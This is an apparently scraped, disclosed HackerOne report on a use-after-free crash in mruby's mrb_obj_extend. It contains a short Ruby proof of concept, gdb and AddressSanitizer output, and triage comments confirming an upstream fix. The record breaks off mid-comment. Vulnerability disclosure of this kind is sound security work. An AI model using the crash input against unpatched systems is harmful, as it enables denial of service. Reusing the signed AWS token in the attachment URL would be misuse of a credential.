{"id":197694,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTc2OTQ=","url":"https://hackerone.com/reports/197694","title":"SIGSEGV - mrb_obj_extend - line:413","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-01-12T01:07:55.248Z","submitted_at":"2017-01-12T01:07:55.248Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ston3","url":"/ston3","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-09T01:26:59.033Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-07T01:26:54.048Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PoC:\n-------------------\n\nThe following code triggers the bug (attached as test_mrb_obj_extend_413.rb):\n\n\tmodule Test end\n\tdef method_missing(s)extend(Test)end\n\tdef set(v)a.set(0)end\n\tset(0)\n\nMirb - Debug:\n-------------------\n\n\t(gdb) r test_mrb_obj_extend_413.rb \n\tThe program being debugged has been started already.\n\tStart it from the beginning? (y or n) y\n\tStarting program: /home/x/Desktop/research/test_2/mruby/bin/mirb test_mrb_obj_extend_413.rb\n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e nil\n\t =\u003e :method_missing\n\t =\u003e :set\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x0000000000418e9b in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x7529f0, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n\t413\t    mrb_funcall(mrb, argv[argc], \"extended\", 1, obj);\n\t(gdb) info reg\n\trax            0x7529f0\t7678448\n\trbx            0x0\t0\n\trcx            0x3\t3\n\trdx            0x0\t0\n\trsi            0x6ad1b0\t7000496\n\trdi            0x6ad010\t7000080\n\trbp            0x7fffffffc470\t0x7fffffffc470\n\trsp            0x7fffffffc420\t0x7fffffffc420\n\tr8             0x1\t1\n\tr9             0x6b01b0\t7012784\n\tr10            0x7fff0000000a\t140733193388042\n\tr11            0x7ffff7895770\t140737346361200\n\tr12            0x401ca0\t4201632\n\tr13            0x7fffffffe040\t140737488347200\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x418e9b\t0x418e9b \u003cmrb_obj_extend+241\u003e\n\teflags         0x10206\t[ PF IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t408\t  for (i = 0; i \u003c argc; i++) {\n\t409\t    mrb_check_type(mrb, argv[i], MRB_TT_MODULE);\n\t410\t  }\n\t411\t  while (argc--) {\n\t412\t    mrb_funcall(mrb, argv[argc], \"extend_object\", 1, obj);\n\t413\t    mrb_funcall(mrb, argv[argc], \"extended\", 1, obj);\n\t414\t  }\n\t415\t  return obj;\n\t416\t}\n\t417\t\n\n\t\nBacktrace:\n-------------------\n\n\t(gdb) bt\n\t#0  0x0000000000418e9b in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x7529f0, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n\t#1  0x0000000000418f43 in mrb_obj_extend_m (mrb=0x6ad010, self=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:450\n\t#2  0x0000000000426f65 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b00f0, pc=0x71d50c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1174\n\t#3  0x000000000042541b in mrb_vm_run (mrb=0x6ad010, proc=0x6b0000, self=..., stack_keep=1) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772\n\t#4  0x0000000000402b90 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\nClang - mirb\n-------------------\n\n\tx@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mirb test_mrb_obj_extend_413.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e nil\n\t =\u003e :method_missing\n\t =\u003e :set\n\t=================================================================\n\t==2583==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e850 at pc 0x000000595ddc bp 0x7fffbc91f530 sp 0x7fffbc91f528\n\tREAD of size 8 at 0x61d00001e850 thread T0\n\t\t#0 0x595ddb in mrb_obj_extend /home/x/Desktop/research/clang/mruby/src/kernel.c:413:5\n\t\t#1 0x58d36f in mrb_obj_extend_m /home/x/Desktop/research/clang/mruby/src/kernel.c:450:10\n\t\t#2 0x5df4e8 in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1174:18\n\t\t#3 0x5d2fbb in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n\t\t#4 0x4f3ee8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n\t\t#5 0x7ff991aaeec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#6 0x41a585 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a585)\n\t\nMruby - Debug:\n-------------------\n\t\n\t(gdb) r test_mrb_obj_extend_413.rb \n\tThe program being debugged has been started already.\n\tStart it from the beginning? (y or n) y\n\tStarting program: /home/x/Desktop/research/test_2/mruby/bin/mruby test_mrb_obj_extend_413.rb\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x0000000000418765 in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x759b10, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n\t413\t    mrb_funcall(mrb, argv[argc], \"extended\", 1, obj);\n\t(gdb) info reg\n\trax            0x759b10\t7707408\n\trbx            0x6bfe40\t7077440\n\trcx            0x4\t4\n\trdx            0x0\t0\n\trsi            0x6ad1b0\t7000496\n\trdi            0x6ad010\t7000080\n\trbp            0x7fffffffd5a0\t0x7fffffffd5a0\n\trsp            0x7fffffffd550\t0x7fffffffd550\n\tr8             0x1\t1\n\tr9             0x0\t0\n\tr10            0x0\t0\n\tr11            0x7ffff7895770\t140737346361200\n\tr12            0x401b20\t4201248\n\tr13            0x7fffffffe040\t140737488347200\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x418765\t0x418765 \u003cmrb_obj_extend+241\u003e\n\teflags         0x10202\t[ IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t408\t  for (i = 0; i \u003c argc; i++) {\n\t409\t    mrb_check_type(mrb, argv[i], MRB_TT_MODULE);\n\t410\t  }\n\t411\t  while (argc--) {\n\t412\t    mrb_funcall(mrb, argv[argc], \"extend_object\", 1, obj);\n\t413\t    mrb_funcall(mrb, argv[argc], \"extended\", 1, obj);\n\t414\t  }\n\t415\t  return obj;\n\t416\t}\n\t417\n\nBacktrace:\n-------------------\n\n\t(gdb) bt\n\t#0  0x0000000000418765 in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x759b10, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n\t#1  0x000000000041880d in mrb_obj_extend_m (mrb=0x6ad010, self=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:450\n\t#2  0x0000000000424df2 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b0120, pc=0x71b41c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1174\n\t#3  0x00000000004232a8 in mrb_vm_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772\n\t#4  0x000000000042b2bc in mrb_top_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:2490\n\t#5  0x0000000000445cca in mrb_load_exec (mrb=0x6ad010, p=0x709480, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n\t#6  0x0000000000445d60 in mrb_load_file_cxt (mrb=0x6ad010, f=0x709080, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n\t#7  0x00000000004024f8 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n\nClang - mruby\n-------------------\n\n\tx@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mruby test_mrb_obj_extend_413.rb \n\t=================================================================\n\t==2585==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e850 at pc 0x0000005947ec bp 0x7fff9d072750 sp 0x7fff9d072748\n\tREAD of size 8 at 0x61d00001e850 thread T0\n\t\t#0 0x5947eb in mrb_obj_extend /home/x/Desktop/research/clang/mruby/src/kernel.c:413:5\n\t\t#1 0x58bd7f in mrb_obj_extend_m /home/x/Desktop/research/clang/mruby/src/kernel.c:450:10\n\t\t#2 0x5d8fb8 in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1174:18\n\t\t#3 0x5cca8b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n\t\t#4 0x5ffa48 in mrb_top_run /home/x/Desktop/research/clang/mruby/src/vm.c:2490:12\n\t\t#5 0x66fe49 in mrb_load_exec /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7\n\t\t#6 0x670965 in mrb_load_file_cxt /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10\n\t\t#7 0x4f3ad5 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n\t\t#8 0x7f84000caec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#9 0x41a4e5 in _start (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a4e5)\n\nImpact\n-------------------\n\nAs far as I can see, it is not exploitable. But it can cause DoS.","vulnerability_information_html":"\u003ch2 id=\"poc\"\u003ePoC:\u003c/h2\u003e\n\n\u003cp\u003eThe following code triggers the bug (attached as test_mrb_obj_extend_413.rb):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emodule Test end\ndef method_missing(s)extend(Test)end\ndef set(v)a.set(0)end\nset(0)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"mirb-debug\"\u003eMirb - Debug:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) r test_mrb_obj_extend_413.rb \nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/x/Desktop/research/test_2/mruby/bin/mirb test_mrb_obj_extend_413.rb\nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; nil\n =\u0026gt; :method_missing\n =\u0026gt; :set\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000418e9b in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x7529f0, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n413     mrb_funcall(mrb, argv[argc], \u0026quot;extended\u0026quot;, 1, obj);\n(gdb) info reg\nrax            0x7529f0 7678448\nrbx            0x0  0\nrcx            0x3  3\nrdx            0x0  0\nrsi            0x6ad1b0 7000496\nrdi            0x6ad010 7000080\nrbp            0x7fffffffc470   0x7fffffffc470\nrsp            0x7fffffffc420   0x7fffffffc420\nr8             0x1  1\nr9             0x6b01b0 7012784\nr10            0x7fff0000000a   140733193388042\nr11            0x7ffff7895770   140737346361200\nr12            0x401ca0 4201632\nr13            0x7fffffffe040   140737488347200\nr14            0x0  0\nr15            0x0  0\nrip            0x418e9b 0x418e9b \u0026lt;mrb_obj_extend+241\u0026gt;\neflags         0x10206  [ PF IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) l\n408   for (i = 0; i \u0026lt; argc; i++) {\n409     mrb_check_type(mrb, argv[i], MRB_TT_MODULE);\n410   }\n411   while (argc--) {\n412     mrb_funcall(mrb, argv[argc], \u0026quot;extend_object\u0026quot;, 1, obj);\n413     mrb_funcall(mrb, argv[argc], \u0026quot;extended\u0026quot;, 1, obj);\n414   }\n415   return obj;\n416 }\n417 \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"backtrace\"\u003eBacktrace:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) bt\n#0  0x0000000000418e9b in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x7529f0, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n#1  0x0000000000418f43 in mrb_obj_extend_m (mrb=0x6ad010, self=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:450\n#2  0x0000000000426f65 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b00f0, pc=0x71d50c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1174\n#3  0x000000000042541b in mrb_vm_run (mrb=0x6ad010, proc=0x6b0000, self=..., stack_keep=1) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772\n#4  0x0000000000402b90 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"clang-mirb\"\u003eClang - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mirb test_mrb_obj_extend_413.rb \nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; nil\n =\u0026gt; :method_missing\n =\u0026gt; :set\n=================================================================\n==2583==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e850 at pc 0x000000595ddc bp 0x7fffbc91f530 sp 0x7fffbc91f528\nREAD of size 8 at 0x61d00001e850 thread T0\n    #0 0x595ddb in mrb_obj_extend /home/x/Desktop/research/clang/mruby/src/kernel.c:413:5\n    #1 0x58d36f in mrb_obj_extend_m /home/x/Desktop/research/clang/mruby/src/kernel.c:450:10\n    #2 0x5df4e8 in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1174:18\n    #3 0x5d2fbb in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n    #4 0x4f3ee8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n    #5 0x7ff991aaeec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n    #6 0x41a585 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a585)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"mruby-debug\"\u003eMruby - Debug:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) r test_mrb_obj_extend_413.rb \nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/x/Desktop/research/test_2/mruby/bin/mruby test_mrb_obj_extend_413.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000418765 in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x759b10, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n413     mrb_funcall(mrb, argv[argc], \u0026quot;extended\u0026quot;, 1, obj);\n(gdb) info reg\nrax            0x759b10 7707408\nrbx            0x6bfe40 7077440\nrcx            0x4  4\nrdx            0x0  0\nrsi            0x6ad1b0 7000496\nrdi            0x6ad010 7000080\nrbp            0x7fffffffd5a0   0x7fffffffd5a0\nrsp            0x7fffffffd550   0x7fffffffd550\nr8             0x1  1\nr9             0x0  0\nr10            0x0  0\nr11            0x7ffff7895770   140737346361200\nr12            0x401b20 4201248\nr13            0x7fffffffe040   140737488347200\nr14            0x0  0\nr15            0x0  0\nrip            0x418765 0x418765 \u0026lt;mrb_obj_extend+241\u0026gt;\neflags         0x10202  [ IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) l\n408   for (i = 0; i \u0026lt; argc; i++) {\n409     mrb_check_type(mrb, argv[i], MRB_TT_MODULE);\n410   }\n411   while (argc--) {\n412     mrb_funcall(mrb, argv[argc], \u0026quot;extend_object\u0026quot;, 1, obj);\n413     mrb_funcall(mrb, argv[argc], \u0026quot;extended\u0026quot;, 1, obj);\n414   }\n415   return obj;\n416 }\n417\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"backtrace\"\u003eBacktrace:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) bt\n#0  0x0000000000418765 in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x759b10, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n#1  0x000000000041880d in mrb_obj_extend_m (mrb=0x6ad010, self=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:450\n#2  0x0000000000424df2 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b0120, pc=0x71b41c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1174\n#3  0x00000000004232a8 in mrb_vm_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772\n#4  0x000000000042b2bc in mrb_top_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:2490\n#5  0x0000000000445cca in mrb_load_exec (mrb=0x6ad010, p=0x709480, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#6  0x0000000000445d60 in mrb_load_file_cxt (mrb=0x6ad010, f=0x709080, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#7  0x00000000004024f8 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"clang-mruby\"\u003eClang - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mruby test_mrb_obj_extend_413.rb \n=================================================================\n==2585==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e850 at pc 0x0000005947ec bp 0x7fff9d072750 sp 0x7fff9d072748\nREAD of size 8 at 0x61d00001e850 thread T0\n    #0 0x5947eb in mrb_obj_extend /home/x/Desktop/research/clang/mruby/src/kernel.c:413:5\n    #1 0x58bd7f in mrb_obj_extend_m /home/x/Desktop/research/clang/mruby/src/kernel.c:450:10\n    #2 0x5d8fb8 in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1174:18\n    #3 0x5cca8b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n    #4 0x5ffa48 in mrb_top_run /home/x/Desktop/research/clang/mruby/src/vm.c:2490:12\n    #5 0x66fe49 in mrb_load_exec /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7\n    #6 0x670965 in mrb_load_file_cxt /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10\n    #7 0x4f3ad5 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n    #8 0x7f84000caec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n    #9 0x41a4e5 in _start (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a4e5)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAs far as I can see, it is not exploitable. But it can cause DoS.\u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":151694,"file_name":"test_mrb_obj_extend_413.rb","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/151/694/e50eb5140addede79eecddbcb665e28488147eab/test_mrb_obj_extend_413.rb?response-content-disposition=attachment%3B%20filename%3D%22test_mrb_obj_extend_413.rb%22%3B%20filename%2A%3DUTF-8%27%27test_mrb_obj_extend_413.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045206Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026X-Amz-Signature=de1267e19778f893a0309ab964cc21c42f36cdbb8c355948f7b7f074ef31fcbc","file_size":84,"type":"text/plain"}],"allow_singular_disclosure_at":"2017-03-09T01:26:54.100Z","allow_singular_disclosure_after":-120194712.29240833,"singular_disclosure_allowed":true,"vote_count":8,"voters":["icanthack","mpz","eveeez","apapedulimu","a5tronaut","spetr0x","oldusername","jeffakiller123"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1415127,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-01-12T01:07:55.447Z","updated_at":"2017-01-12T01:07:55.447Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1454706,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue and opened a report upstream: https://github.com/mruby/mruby/issues/3419","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the issue and opened a report upstream: \u003ca title=\"https://github.com/mruby/mruby/issues/3419\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3419\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3419\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-31T19:14:39.227Z","updated_at":"2017-01-31T19:14:39.227Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1465160,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue was recently fixed upstream in https://github.com/mruby/mruby/commit/bf4e79cc62af809138bc7db7e54ece67080b5fa8\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report. This issue was recently fixed upstream in \u003ca title=\"https://github.com/mruby/mruby/commit/bf4e79cc62af809138bc7db7e54ece67080b5fa8\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Fbf4e79cc62af809138bc7db7e54ece67080b5fa8\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/bf4e79cc62af809138bc7db7e54ece67080b5fa8\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within two weeks, so we\u0026#39;ll be in touch with you again 